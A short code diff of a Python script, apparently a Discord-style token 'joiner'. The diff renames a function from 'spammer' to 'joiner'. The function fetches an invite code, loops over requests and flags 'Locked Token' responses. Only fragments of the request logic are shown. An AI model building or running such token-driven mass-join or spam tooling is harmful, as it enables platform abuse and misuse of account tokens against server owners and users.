@@ -5,7 +5,7 @@ import colorama, requests
 with open('./config/config.json') as f:
    config = json.load(f)
 
-def spammer():
+def joiner():
     invite_code = str(requests.get(config["invite"]).text)
     while True:
         sys.stdout.write(colorama.Fore.CYAN + "> ")
@@ -24,4 +24,4 @@ def spammer():
             if "403" in str(r):
                 sys.stdout.write(colorama.Fore.RED + "> ")
                 print("Locked Token")
-spammer()
+joiner()
